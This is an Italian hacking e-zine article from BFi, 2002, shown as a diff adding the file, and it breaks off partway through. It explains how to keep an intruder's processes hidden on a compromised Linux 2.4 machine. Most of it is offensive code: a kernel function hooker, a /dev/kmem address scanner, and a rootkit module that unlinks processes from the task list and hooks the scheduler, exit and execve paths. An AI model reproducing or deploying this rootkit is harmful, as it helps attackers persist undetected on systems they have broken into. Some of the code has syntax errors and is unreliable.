@@ -1,0 +1,1044 @@
+==============================================================================
+--------------------[ BFi11-dev - file 11 - 04/09/2002 ]----------------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        Tutto il materiale contenuto in BFi ha fini eslusivamente informativi
+        ed educativi. Gli autori di BFi non si riterranno in alcun modo
+        responsabili per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
+        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita` per l'uso che farai delle
+        informazioni contenute in BFi.
+        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite BFi nella sua forma integrale ed originale.
+------------------------------------------------------------------------------
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ SMASHiNG THE KERNEL F0R FUN AND PR0FiT
+-----[ Dark-Angel <Dark0@angelfire.com>
+
+
+
+-=Premesse=-
+	     - Avere un kernel 2.4.x (anche se il tutto e' facilmente
+               portabile al 2.2.x)
+	     - Avere un minimo di conoscenze sui sistemi operativi
+	     - Non avere il q.i. di un lemming
+	     - Avere una sorella/amica carina da presentarmi :)
+
+-=0x1=- Prefazione:
+	Oggigiorno esiste, ed e' facilmente reperibile, una moltitudine
+	di programmilli che permettono di occultare processi in un sistema,
+        ma, come ben sappiamo, sono assai lungi dall'essere perfetti.
+	Prendiamo ad esempio il piu' classico dei trojan binari: basta
+        eseguire strace e subito ci salta all'occhio che c'e' qualcosa che non
+        va. Morale in circa 20 secondi (se l'amministratore di sistema e'
+        particolarmente	imbranato) ci ritroviamo sgamati e sbattuti fuori dal
+ 	nostro sistema preferito. I secondi possono salire ad una quarantina
+        se ci affidiamo	a tool che lavorano a livello kernel, come i
+        celeberrimi knark ed adore ma, a mio avviso, sono decisamente troppo
+        pochi :-)
+ 	In questo articolo illustrero' una tecnica capace di far salire
+	notevolmente la durata della nostra permanenza nella macchina, od
+	almeno di complicare un tantinello la vita al nostro caro admin :)
+
+-=0x2=- Una striminzita base:
+
+	In questo paragrafo vi daro' un'idea delle cose di cui dovete almeno
+        conoscere l'esistenza per capire questo articolo.
+	Ogni processo e' in memoria sotto forma di una struttura dati chiamata
+	task_struct definita in linux/sched.h ed i processi del sistema sono
+	tutti presenti in una lista circolare a doppia percorrenza
+	(percorrenza singola nei 2.2.x) di queste task_struct. Quando dalla
+ 	nostra shell preferita digitiamo il nome di un comando succede a
+	grandi linee questo:
+
+		- Viene richiamata la sys_fork per duplicare il processo
+		  (ovvero la struttura dati corrente, la shell). Ne viene
+		  creata una esatta copia e linkata alla lista.
+		- Viene richiamata la sys_execve che sovrascrive il PCB appena
+		  creato (Process Control Block, ovvero la task_struct) con le
+		  informazioni relative al nuovo processo.
+
+	[1] Un'altra cosa che dovete assolutamente conoscere e' che cos'e' lo
+	scheduler e qual e' la sua funzione. In sistemi multiprogrammati
+	i processi non vengono eseguiti fino alla fine uno dopo l'altro
+	come in DOS, la macchina esegue	per un tot di tempo un processo e
+	poi switcha ad un altro. Lo scheduler puo' essere definito come
+	l'algoritmo che il sistema operativo esegue per decidere a quale
+	processo concedere la cpu. Ovviamente la scadenza del quanto di tempo
+	assegnato ad un processo non e' il solo fattore che fa richiamare
+	lo scheduler. Inoltre in linux esistono le epoche, che	possiamo
+	definire come il periodo di tempo che impiegano tutti i	processi ad
+	esaurire il loro quanto di tempo. Se un processo termina il suo quanto
+        dovra' attendere la fine dell'epoca corrente perche gli venga
+        assegnato dell'altro tempo di cpu. Alla fine di ogni epoca i quanti di
+        tempo di tutti i processi vengono ripristinati secondo	particolari
+        criteri che non ci interessano.
+
+	[2] Gli spinlock invece sono un espediente per evitare race condition.
+	Funzionano attraverso una variabile condivisa: una funzione puo'
+	ottenere il lock ponendo una variabile ad un valore specifico e se
+	un'altra funzione dovesse richiedere il lock vedendolo non disponibile
+	"spin"nerebbe in un ciclo busy/wait fino all'ottenimento del lock.
+	Gli spinlock, al contrario dei semafori, possono essere utilizzati in
+	interrupt context, mentre i semafori non possono perche' possono
+	mettere un processo a dormire.
+
+-=0x3=- Al lavoro:
+
+	Bene, ora che ci siamo fatti un'idea delle cose su cui andremo a
+	lavorare possiamo cominciare.
+	I nostri amici security tool ed il sistema operativo danno per
+	scontato che tutti i processi si debbano trovare sulla lista per poter
+	essere in esecuzione... beh, questo e' solo in parte vero.
+	I processi si devono trovare sulla lista solamente nel momento in cui
+	viene valutata la loro desiderabilita' (goodness) per il successivo
+	context switch (ovvero la sostituzione del processo che puo'
+	utilizzare la cpu). Una volta che il processo e' entrato in esecuzione
+	noi potremmo sganciare il suo PCB senza che il sistema se ne accorga,
+	a patto di rimetterlo al suo posto prima del successivo passaggio
+	dello scheduler.
+	Quando lo scheduler viene richiamato nel momento dell'analisi/scelta
+	del prossimo processo da eseguire, non puo' essere interrotto e non
+	puo' runnare nessun processo (eccezion fatta per lo swapper).
+	Percio' se fossimo in grado di agganciare un PCB alla lista dei
+	processi subito prima dell'analisi da parte dello scheduler, e
+	sganciarlo subito dopo la fine rimanendo sempre nella zona
+	ininterruttibile, potremmo portare avanti l'esecuzione di un processo
+	senza che sia presente nella lista ed in modo totalmente stealth, in
+	quanto esso diventerebbe "presente" solamente quando niente puo'
+	runnare e pertanto rilevarlo.
+	Facile a dirsi vero? Fortunatamente non e' nemmeno troppo difficile
+	a farsi :-)
+	Ora guardando un po' il codice del nostro scheduler presente in
+	/usr/src/linux/kernel/sched.c, dobbiamo riuscire a trovare il punto in
+	cui viene controllata la lista per calcolare la goodness di ciascun
+	processo.
+	Con una semplice ricerca della parola "goodness" all'interno del
+	codice della funzione schedule() guardate che salta fuori:
+
+	c=-1000;
+
+        list_for_each(tmp, &runqueue_head) {
+           p = list_entry(tmp, struct task_struct, run_list);
+              if (can_schedule(p, this_cpu)) {
+                  int weight = goodness(p, this_cpu, prev->active_mm);
+                    if (weight > c)
+                         c = weight, next = p;
+	      }
+	}
+
+	if (unlikely(!c)) {
+           struct task_struct *p;
+           spin_unlock_irq(&runqueue_lock);
+           read_lock(&tasklist_lock);
+             for_each_task(p)
+                p->counter = (p->counter >> 1) + NICE_TO_TICKS(p->nice);
+	   read_unlock(&tasklist_lock);
+	   spin_lock_irq(&runqueue_lock);
+	   goto repeat_schedule;
+	}
+
+	I processi in memoria non sono linkati solamente attraverso struct
+	task_struct, ma esiste anche una lista di struct list_head, i cui
+	nodi sono contenuti all'interno dei task_struct, e sono appunto
+	questi nodi che lo scheduler utilizza per scorrere la lista:
+	list_for_each scorre la runqueue list e per ogni list_head si ricava
+	il corrispondente task_struct di cui poi si calcola la goodness.
+	Quando viene agganciata/sganciata una task_struct dalla lista dei
+	processi, questa seconda lista viene automaticamente aggiornata.
+	Il blocco contenuto nell'if (unlikely(!c)) si occupa del refresh dei
+	quanti di tempo nel caso l'epoca sia finita.
+	Oltre questo codice si procede al context switch, percio' e qui che
+	dobbiamo intervenire.
+
+-=0x4=- L'hook:
+
+	Per "agganciare" una funzione nel mezzo dovremo usare una variante
+	dell'ormai celeberrima tecnica di Silvio Cesare, ma comunque nulla
+	di complicato.
+	Ovviamente, siccome dobbiamo far eseguire del codice estraneo, dovremo
+	fare un jump ad una nostra funzione, fare il lavoro sporco e risaltare
+	nel mezzo della funzione originaria dopo aver eseguito le istruzioni
+	backuppate per far continuare l'esecuzione come se nulla fosse.
+	Si noti che la funzione originaria non viene mai ripristinata.
+	Ecco un piccolo esempio di quanto ho detto:
+
+<-| smash/DoubleChain.c |->
+	/* 
+		DoubleChain, a simple function hooker
+		by Dark-Angel <Dark0@angelfire.com>
+	*/
+
+#define __KERNEL__
+#define MODULE
+#define LINUX
+
+#include <linux/module.h>
+#define CODEJUMP 7
+#define BACKUP 7
+/* Il numero di bytes da backuppare dipende dal codice che dobbiamo
+ * modificare, l'importante e' non rompere nessuna istruzione ed averne
+ * almeno sette
+ */
+static char backup_one[BACKUP+CODEJUMP]="\x90\x90\x90\x90\x90\x90\x90"
+				        "\xb8\x90\x90\x90\x90\xff\xe0";
+static char jump_code[CODEJUMP]=	"\xb8\x90\x90\x90\x90\xff\xe0";
+
+#define FIRST_ADDRESS 0xc0101235 //Indirizzo della prima istruzione
+				 //che andremo sovrascrivere
+unsigned long *memory;
+
+void cenobite(void) {
+	printk("Funzione hookata con successo\n");
+	asm volatile("mov %ebp,%esp;popl %esp;jmp backup_one);
+/* 
+ * Questo serve per ripristinare lo stack dato che i primi byte
+ * di una funzione (cenobite in questo caso) sono sempre per il salvataggio
+ * dei parametri, cosa che ci incasinerebbe non poco perche "saltando" via
+ * non li libereremmo, cosi' dobbiamo liberare la memoria a mano.
+ * Col jump andiamo ad eseguire il codice backuppato e poi saltiamo di
+ * nuovo alla funzione originale come se nulla fosse
+ */
+}
+
+int init_module(void) {
+	*(unsigned long *)&jump_code[1]=(unsigned long )cenobite;
+	*(unsigned long *)&backup_one[BACKUP+1]=(unsigned long)(FIRST_ADDRESS+
+								BACKUP);
+	// Ovvero saltiamo subito dopo le istruzioni che abbiamo sovrascritto
+	memory=(unsigned long *)FIRST_ADDRESS;
+	memcpy(backup_one,memory,CODEBACK);
+	/* Salviamo i bytes originali all'inizio dell'array di backup.
+	 * Ora questo array sara' cosi' composto:
+         *
+	 * n bytes originali e jump all'indirizzo base + n
+	 */
+	memcpy(memory,jump_code,CODEJUMP);
+	return 0;
+}
+
+void cleanup_module(void) {
+		memcpy(memory,backup_one,BACKUP);
+}
+<-X->
+
+	Inutile dire che con questo sistema e' possibile hookare praticamente
+	qualsiasi cosa in qualsiasi punto, e se siamo un po' furbi
+	difficilmente verremo sgamati da tool che verificano l'intergrita'
+	della call, in quanto noi possiamo non toccarle proprio, ci basta
+	giocare con le 	funzioni che a loro volta vengono richiamate dalle
+	call. Basta solo stare attenti a non rompere le istruzioni ed a
+	complicazioni varie tipo i jump nel mezzo del nostro hook ad opera di
+	altre porzioni del codice.
+
+-=0x5=-	L'applicazione:
+
+	Allora, per cominciare abbiamo bisogno dell'indirizzo del "c=-1000"
+	e dell'indirizzo della prima istruzione dopo il blocco per il refresh
+	dei quanti di tempo. Perche' proprio l'indirizzo di c=-1000? Perche'
+	si trova subito prima della list_for_each, e vogliamo evitare di
+	sovrascrivere una parte del ciclo e generare bordelli allucinanti.
+	Inoltre noi non abbiamo nessun punto di riferimento per trovare gli
+	indirizzi di dove andare a sovrascrivere e quell'assegnamento
+	essendo costante e' come un faro nel buio :)
+	Stesso discorso per il secondo indirizzo da trovare, cercheremo quello
+	del primo assegnamento dopo il blocco di codice per il refresh.
+	Sulla nostra box casalinga possiamo procedere in questo modo:
+	anteponiamo un asm volatile("nop;nop;nop;........."); alla nostre
+	istruzioni bersaglio, facciamo una ricompilazione parziale del kernel
+	per generare il nuovo vmlinux e poi attraverso un objdump -dS vmlinux
+	possiamo ottenere una magnifica panoramica di istruzioni ed indirizzi.
+	Naturalmente sono solamente fittizi, ma almeno ora possiamo andare a
+	studiare con relativa comodita' una sequenza di istruzioni che ci
+	puo permettere di ricavare un'impronta per poi effettuare dei
+	parse di /dev/kmem utilizzandola come pattern per ricavare degli
+	indirizzi da utilizzare come riferimento senza troppi altri casini.
+	Le istruzioni-riferimento interessate per il calcolo dell'indirizzo
+	del primo hook allo scheduler e le loro dimensioni sfortunatamente
+	variano	da kernel a kernel, percio' dovremo fare in modo di riuscire a
+	riconoscerle e poi camminare a ritroso controllando gli opcode per
+	"isolare" le istruzioni per non spezzarle e stando attenti che i bytes
+	siano sufficienti per farci stare il nostro jump. Fortunatamente
+	gli altri sembrano essere standard come dimensioni, comunque qui di
+	seguito metto il codice di uno scanner che, anche se grezzo, non ha
+	mai sbagliato un colpo.
+
+<-| smash/Hunter.c |->
+	/* 	
+		Hunter, a raw addresses hunter and memory parser
+		by Dark-Angel <Dark0@angelfire.com>
+	*/
+
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+char *sch_s_pattern[]={"18","fc","ff","ff",NULL};
+char *exit_s_pattern[]={"8b","b3","98","00","00","00",NULL};
+char *exit_e_pattern[]={"57","56","53",NULL};
+char *do_execve_pattern[]={"81","c4","38","01","00","00",NULL};
+char *do_sysctl_pattern[]={"83","ec","04","55","57","56","53",NULL};
+char *cli="fa";
+char computed_address[8];
+char *end_string="/g\" config.h > tmpconf";
+char *sost_1_string=
+"sed \"s/^\\#define O_E_ADD INSERT/\\#define O_E_ADD 0x";
+char *sost_2_string=
+"sed \"s/^\\#define O_F_ADD INSERT/\\#define O_F_ADD 0x";
+char *sost_3_string=
+"sed \"s/^\\#define O_EXIT_END INSERT/\\#define O_EXIT_END 0x";
+char *sost_4_string=
+"sed \"s/^\\#define O_DO_EXECVE_END INSERT/\\#define O_DO_EXECVE_END 0x";
+char *sost_5_string=
+"sed \"s/^\\#define CODEBACK1 INSERT/\\#define CODEBACK1 ";
+char *sost_6_string=
+"sed \"s/^\\#define O_DO_SYSCTL INSERT/\\#define O_DO_SYSCTL 0x";
+char command_string[100];
+
+int isNotOp(unsigned char dati);
+int isMov(unsigned char buf[]);
+int main (int argc, char *argv[]) {
+
+int file,pos,times;
+unsigned long address_exit,address_schedule,runner,address_result;
+unsigned char data;
+unsigned char backuped;
+unsigned long offset;
+unsigned char buffer[2];
+if((file=open("/dev/kmem",O_RDONLY))==-1)
+	exit -1;
+address_schedule=(unsigned long)0xc0100000;
+lseek(file,address_schedule,SEEK_SET);
+runner=pos=times=0;
+while(1) {
+	read(file,&data,1);
+        sprintf(buffer,"%.2x",data);
+        if(!(strcmp(buffer,sch_s_pattern[pos]))) {
+		if((pos==3)&&(times==3)) {
+			address_schedule-=3;
+			lseek(file,-5,SEEK_CUR);
+			// Ora sia address_schedule che il fp 
+			// puntano al primo byte prima dell'inizio 
+			// del pattern
+ 			runner++;
+			read(file,&data,1);
+			sprintf(buffer,"%.2x",data);
+
+ 			while(!(isMov(buffer))) {
+			SPIN:	 runner++;
+			 	 address_schedule--;
+				 lseek(file,-2,SEEK_CUR);
+				 read(file,&data,1);
+				 sprintf(buffer,"%.2x",data);
+			}
+			if(runner+4<7) 
+				 // Se non ci sono 7 bytes disponibili 
+				 // retrocedi di una istruzione
+				 goto SPIN;
+			 sprintf(computed_address,"%x", address_schedule-1);
+			 strcat(command_string,sost_2_string);
+			 strcat(command_string,computed_address);
+			 strcat(command_string,end_string);
+			 system(command_string);
+			 system("mv tmpconf config.h");
+			 memset(command_string,0, sizeof(command_string));
+			 sprintf(computed_address,"%d",runner+4);
+			 strcat(command_string,sost_5_string);
+			 strcat(command_string,computed_address);
+			 strcat(command_string,end_string);
+			 system(command_string);
+			 system("mv tmpconf config.h");
+			 break;
+		}
+	 	if((pos==3)&&(times<3)){
+			 times++;
+			 goto RESET;
+		}
+	        pos++;
+	 }
+	 else 
+		 RESET: pos=0;
+	 address_schedule++;
+
+} //Fine while
+
+pos=0;
+memset(command_string,0,sizeof(command_string));
+
+while(1) {
+	 backuped=data;
+	 read(file,&data,1);
+	 sprintf(buffer,"%.2x",data);
+	 if( (!(strcmp(buffer,cli))) && (isNotOp(backuped)) ) {
+		 while(1) {
+			 read(file,&data,1);
+			 sprintf(buffer,"%.2x",data);
+			 if(isMov(buffer)) {
+			    sprintf(computed_address, "%x",address_schedule+1);
+			    strcat(command_string, sost_1_string);
+			    strcat(command_string, computed_address);
+			    strcat(command_string, end_string);
+			    system(command_string);
+			    system( "mv tmpconf config.h");
+			    goto EXIT;
+ 			 }
+			 else
+				 address_schedule++;
+ 		}
+
+	}
+ address_schedule++;
+
+}
+
+EXIT: pos=0;
+memset(command_string,0,sizeof(command_string));
+while(1) {
+	 read(file,&data,1);
+	 sprintf(buffer,"%.2x",data);
+	 if(!(strcmp(buffer,exit_s_pattern[pos]))) {
+		 if(pos==5) {
+			 pos=0;
+			 while(1) {
+				 read(file,&data,1);
+				 sprintf(buffer,"%.2x", data);
+				 if(!(strcmp(buffer, exit_e_pattern[pos]))) {
+					 if(pos==2) {
+						sprintf(computed_address,"%x",
+						address_schedule-6);
+						strcat(command_string,
+						sost_3_string);
+						strcat(command_string,
+						computed_address);
+						strcat(command_string,
+						end_string);
+						system(command_string);
+						system("mv tmpconf config.h");
+						break;
+					    }
+					    pos++;
+				 }
+				 else
+				          pos=0;
+				 address_schedule++;
+			 }
+			 break;
+ 		 }
+	  pos++;
+ 	}
+	else
+		 pos=0;
+	address_schedule++;
+}
+
+times=pos=0;
+memset(command_string,0,sizeof(command_string));
+ 
+while(1) {	
+	read(file,&data,1);
+	 sprintf(buffer,"%.2x",data);
+	 if(!(strcmp(buffer,do_sysctl_pattern[pos]))) {
+		 if((pos==6)&&(times==1)) {
+			 sprintf(computed_address,"%x",
+			 address_schedule-2);
+			 strcat(command_string,sost_6_string);
+			 strcat(command_string, computed_address);
+			 strcat(command_string,end_string);
+			 system(command_string);
+			 system("mv tmpconf config.h");
+			 address_schedule++;
+			 break;
+		 }
+		 if((pos==6)&&(times<1)) {
+			 times++;
+			 goto RESTART;
+		 }
+		 pos++;
+	 }
+	 else
+		 RESTART: pos=0;
+	 address_schedule++;
+}
+ 
+pos=0;
+memset(command_string,0,sizeof(command_string));
+
+while(1) {
+	read(file,&data,1);
+	sprintf(buffer,"%.2x",data);
+	 if(!(strcmp(buffer,do_execve_pattern[pos]))) {
+		 if(pos==5) {
+			 sprintf(computed_address,"%x",
+			 address_schedule-1);
+			 strcat(command_string,sost_4_string);
+			 strcat(command_string, computed_address);
+			 strcat(command_string,end_string);
+			 system(command_string);
+			 system("mv tmpconf config.h");
+			 break;
+		 }
+		 else
+			 pos++;
+	 }
+	 else
+		 pos=0;
+
+	 address_schedule++;
+}
+
+return 0;
+}
+
+int isNotOp(unsigned char dati) {
+ int counter;
+ unsigned char buf[2];
+ unsigned char *patterns[]={"39","d1","81","89","83","c7",NULL};
+
+ sprintf(buf,"%.2x",dati);
+ counter=0;
+ for(;counter<6;counter++)
+	 if((strstr(buf,patterns[counter])))
+		 return 0;
+return 1;
+}
+
+int isMov(unsigned char buffer[]) {
+int counter;
+unsigned char *patterns[]={"8b","89","b8","bf","c7",NULL};
+counter=0;
+	 for(;counter<5;counter++)
+		 if((strstr(buffer,patterns[counter])))
+			 return 1;
+ return 0;
+}
+<-X->
+
+	Ok, ora che l'agganciare lo scheduler ed il trovare gli
+	indirizzi a cui farlo non sono piu' un problema, iniziamo ad occuparci
+	dei processi.
+	Noi vogliamo poter gestire numerosi processi occultati,	percio' dovremo
+	crearci una lista apposita per tenerli in memoria per poi
+	riagganciarli/sganciarli. Terremo un puntatore fisso come testa
+	della pila, ed agganceremo di volta in volta i processi	rilevati come
+	nascosti in questa pila dopo averli slinkati da quella principale. Come
+	testa ho deciso di utilizzare il campo p_pptr dello swapper, percio'
+	alla fine della fiera, ponendo il caso di avere due processi nascosti,
+	la situazione sarebbe questa:
+
+			   Next				Next
+		Primo Proc ----->Secondo Proc nascosto------
+		Nascosto     				   |
+		   ^					   |
+		   |					   |
+		   | Padre				   |
+		   |					   |
+		Swapper --------------------->init <-------|
+			  Processo Successivo
+
+	Swapper->padre punta al primo proc nascosto, e ciascuno di essi punta
+	al successivo eccezion fatta per l'ultimo, il cui campo next punta ad
+	init. Cosi' facendo switchando solo 1 puntatore in fase di scheduling
+	la lista diventera' completa/incompleta. Naturalmente uno scorrimento
+	della lista partendo da swapper->padre rileverebbe tutti i processi,
+	ma si potrebbe ovviare a questo problema utilizzando un puntatore
+	globale esterno... a buon intenditor poche parole.
+	Tutto questo ben di dio pero' ha un prezzo, ci fa incappare in una
+	serie di problemi non indifferenti. Il primo di questi e' la sys_exit:
+	quando un processo termina, il suo pcb deve venir slinkato e per fare
+	cio' viene utilizzata la macro REMOVE_LINKS cosi' definita in
+	/usr/src/linux/include/linux/sched.h
+
+	#define REMOVE_LINKS(p) do { \
+	        (p)->next_task->prev_task = (p)->prev_task; \
+	        (p)->prev_task->next_task = (p)->next_task; \
+		        if ((p)->p_osptr) \
+		                (p)->p_osptr->p_ysptr = (p)->p_ysptr; \
+		        if ((p)->p_ysptr) \
+		                (p)->p_ysptr->p_osptr = (p)->p_osptr; \
+		        else \
+		                (p)->p_pptr->p_cptr = (p)->p_osptr; \
+	        } while (0)
+
+	Come si nota dalle righe 2 e 3 la struttura viene sganciata come
+	se si trovasse su una lista normale, e non tiene conto che se il
+	task precedente e' lo swapper allora non deve essere aggiornato
+	current->prev_task->next_task ma swapper->p_pptr visto che si
+	tratta di un processo nascosto.
+	Fortunatamente per risolverlo basta hookare sul fondo la
+	exit_notify ed implementare un controllo con eventuale correzione
+	dei puntatori. Hookeremo la exit_notify e non la sys_exit perche'
+	a parita' di effetto evitiamo di modificare funzioni normalmente
+	controllate. Sempre per questo motivo per avere una comunicazione
+	da userpsace verso il modulo dovremo hookare una qualsiasi funzione
+	secondaria i cui argomenti provengano senza modifiche dall'userspace.
+	Ma ora iniziano i dolori: nascondere i processi e gestire la lista
+	com'e' facilmente intuibile richiedera' un gran spostamento di 
+	untatori e questo puo' essere causa di numerose race conditions, 
+	mistici ed inspiegabili inchiappettamenti della memoria, un'anormale
+	fuoriuscita di bestemmie e fenomeni di poltergeist (provare per
+	credere).
+	Particolare odio lo suscitano i processi che si forkano, in quanto
+	la execve viene chiamata una sola volta per chissa' quanti processi e
+	non possiamo modificare il pcb direttamente dalla fork in quanto
+	la modifica dei campi del pcb appena creato influenzerebbe la execve
+	facendola incriccare.
+	Percio' per evitare tutto questo macello dobbiamo rilevare runtime
+	questi piccoli bastardi: nonostante un controllo sulla wake_up_process
+	potesse	sembrare estremamente invitante i poltergeist non erano
+	dell'idea, allora gia' che c'ero ho fatto che sfruttare lo scheduler
+	anche per questo: viene esaminata la lista principale in cerca di
+	processi che dovrebbero essere nascosti e, nel caso ne vengano
+	trovati, vengono messi al loro posto. (O fuori posto?:-)
+	Ora beccatevi il codice e leggete i commenti all'interno :)
+
+<-| smash/Phantasmagoria.c |->
+/* 
+	Phantasmagoria, a very cool processes hider
+	by Dark-Angel <Dark0@angelfire.com>
+*/
+
+#define __KERNEL__
+#define MODULE
+#define LINUX
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <sys/syscall.h>
+#include <linux/sched.h>
+#include "config.h"
+
+#define PF_INVISIBLE 0x1000000
+extern void * sys_call_table[];
+void eraser(struct task_struct *p);
+#define SIGHIDE 333 //Non nasconde ma fa generare nascosti
+#define SIGTHIDE 777 //Nasconde e fa generare nascosti
+#define SIGHKILL 666 //Uccide un processo "Thidato" (Total Hide)
+#define CODESIZE 7
+#define CODEBACK2 8
+static char second_backup[CODEBACK2+7]="\x90\x90\x90\x90\x90\x90\x90"
+				       "\x90\xb8\x00\x00\x00\x00\xff"
+				       "\xe0";
+static char first_backup[CODEBACK1+7];
+	//Non inizializzato perche' variabile, lo inizializziamo nell'init
+
+static char third_backup[CODESIZE]="\x90\x90\x90\x90\x90\x90\x90";
+static char fourth_backup[CODESIZE]="\x90\x90\x90\x90\x90\x90\x90";
+static char fifth_backup[CODESIZE]="\x90\x90\x90\x90\x90\x90\x90";
+
+static char inj_first_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+static char inj_second_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+static char inj_third_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+static char inj_fourth_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+static char inj_fifth_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+
+struct task_struct *init;
+unsigned long *second_addr,*third_addr,*fourth_addr,*fifth_addr;
+
+int (*o_kill)(int pid,int sig);
+void (*o_function)(void)=(void*) O_F_ADD;
+
+void first_function(void) {
+
+	/* Primo hook nello scheduler, viene modificato il puntatore */
+
+	write_lock_irq(&tasklist_lock);
+	(&init_task)->next_task=(&init_task)->p_pptr;
+        write_unlock_irq(&tasklist_lock);
+	asm volatile ("mov %ebp,%esp;popl %ebp;jmp first_backup");
+
+}
+
+void second_function(void) {
+	// Secondo hook dello scheduler
+
+	struct task_struct *p;
+	long wflag;
+	write_lock_irqsave(&tasklist_lock,wflag);
+	(&init_task)->next_task=init;
+
+RESTART:
+	p=&init_task;
+	do {
+		if( ((p->flags & PF_INVISIBLE)==PF_INVISIBLE) &&
+               	    (strcmp(p->comm,"bash"))) {
+		/* Il thiding della shell corrente da parte della stessa i
+		 * genera un crash , percio' non possiamo nasconderle
+		 * automaticamente.  */
+			 eraser(p);
+			 goto RESTART;
+	         }
+	         p=p->next_task;
+	 } while(p!=&init_task);
+	/* Il ciclo qua sopra e' quello che ricerca nella lista
+	 * processi "fuori posto". Se ne trova uno ricomincia la
+	 * ricerca da capo per evitare inchiappettamenti
+	 */
+	if(init->prev_task!=&init_task)
+		init->prev_task=&init_task;
+
+	/* Nel caso init->prev_task sia diverso dallo swapper vuol dire
+	 * che qualcosa e' fuori posto, percio' risistemiamo	*/
+
+	write_unlock_irqrestore(&tasklist_lock,wflag);
+	asm volatile("mov %ebp, %esp; popl %ebp; jmp second_backup");
+}
+
+void eraser(struct task_struct *p) {
+/* Sgancia un processo dalla lista principale e lo aggancia in
+ * testa a quella secondaria */
+
+struct task_struct *father;
+long sflag;
+
+spin_lock_irqsave(&runqueue_lock,sflag);
+father=p->p_pptr;
+if(p->state!=TASK_ZOMBIE) {
+	if(p->prev_task!=&init_task)
+        REMOVE_LINKS(p);
+	else {
+	/* versione modificata della remove_links per via
+	 * di p_pptr al posto di prev_task */
+	      current->prev_task->p_pptr=current->next_task;
+	      current->next_task->prev_task=current->prev_task;
+              if ((current)->p_osptr)
+		      (current)->p_osptr->p_ysptr =(current)->p_ysptr;
+	      if ((current)->p_ysptr)
+                     (current)->p_ysptr->p_osptr = (current)->p_osptr;
+              else
+              	     (current)->p_pptr->p_cptr = (current)->p_osptr;
+	}
+	p->next_task=init_task.p_pptr;
+	p->prev_task=(&init_task)->p_pptr->prev_task;
+	p->p_pptr=father;
+	if(p->next_task->pid!=1)
+		p->next_task->prev_task=p;
+	else
+		p->next_task->prev_task=&init_task;
+	init_task.p_pptr=p;
+       	p->flags |= (PF_INVISIBLE);
+       	(p)->p_ysptr = NULL;
+       	if (((p)->p_osptr = (p)->p_pptr->p_cptr) != NULL)
+	       (p)->p_osptr->p_ysptr = p;
+       	(p)->p_pptr->p_cptr = p;
+}
+
+spin_unlock_irqrestore(&runqueue_lock,sflag);
+}
+
+void third_function(void) {
+/* Modifica alla exit notify */
+long wflag,sflag;
+if  ((current->flags & PF_INVISIBLE)==PF_INVISIBLE) { 
+	spin_lock_irqsave(&runqueue_lock,sflag);
+	write_lock_irqsave(&tasklist_lock,wflag);
+	if((current->prev_task)==(&init_task))
+                current->prev_task->p_pptr=current->next_task;
+	write_unlock_irqrestore(&tasklist_lock,wflag);
+	spin_unlock_irqrestore(&runqueue_lock,sflag);
+}
+
+asm volatile("mov %ebp, %esp; popl %ebp; jmp third_backup");
+}
+
+void fourth_function(void) {
+/* Modifica alla do_execve per far si' che nasconda un processo marcato
+ * come nascosto appena creato */
+
+long wflag;
+if((current->flags & PF_INVISIBLE) == PF_INVISIBLE) {
+	write_lock_irqsave(&tasklist_lock,wflag);
+	if(!(((current->prev_task->flags & PF_INVISIBLE)
+	== PF_INVISIBLE)||(current->prev_task==&init_task)))
+		eraser(current);
+	write_unlock_irqrestore(&tasklist_lock,wflag);
+}
+
+asm volatile("mov %ebp, %esp; popl %ebp; jmp fourth_backup");
+}
+
+
+
+int (*o_do_sysctl)(int *name, int nlen, void *oldval, size_t *oldlenp,
+    void *newval, size_t newlen)=(void *)O_DO_SYSCTL;
+int n_do_sysctl (int *name, int nlen, void *oldval, size_t *oldlenp,
+    void *newval, size_t newlen) {
+/* Funzione per la comunicazione con l'userspace */
+
+int pid,sig;
+struct task_struct *p,*father;
+long wflag,sflag;
+int found=1;
+
+if((name==NULL) && (oldval==NULL) && (oldlenp==NULL) && (newval==NULL)) {
+  sig=(int)nlen;
+  pid=(int)newlen;
+
+  switch(sig) {
+	case SIGHIDE:
+		read_lock(&tasklist_lock);
+		for_each_task(p)
+	        if(p->pid==pid) {
+		       p->flags |= (PF_INVISIBLE);
+		       found=0;
+		       break;
+	       }
+	       read_unlock(&tasklist_lock);
+	       if(found)
+		       return -1;
+	       else
+		       return 0;
+	       break;
+
+	case SIGTHIDE:
+		spin_lock_irqsave(&runqueue_lock,sflag);
+		write_lock_irqsave(&tasklist_lock,wflag);
+
+      		for_each_task(p)
+		if(p->pid==pid) {
+			/* Sposta la struttura in testa alla lista secondaria */
+			father=p->p_pptr;
+			REMOVE_LINKS(p);
+			p->next_task=init_task.p_pptr;
+			p->prev_task=&init_task;
+			p->p_pptr=father;
+			p->next_task->prev_task=p;
+			init_task.p_pptr=p;
+			p->flags |= (PF_INVISIBLE);
+			(p)->p_ysptr = NULL;
+			if (((p)->p_osptr = (p)->p_pptr->p_cptr) != NULL)
+			(p)->p_osptr->p_ysptr = p;
+			(p)->p_pptr->p_cptr = p;
+			found=0;
+			break;
+		}
+		write_unlock_irqrestore(&tasklist_lock,wflag);
+		spin_unlock_irqrestore(&runqueue_lock,sflag);
+		if(found)
+	                return -1;
+                else
+                        return 0;
+	        break;
+	case SIGHKILL:
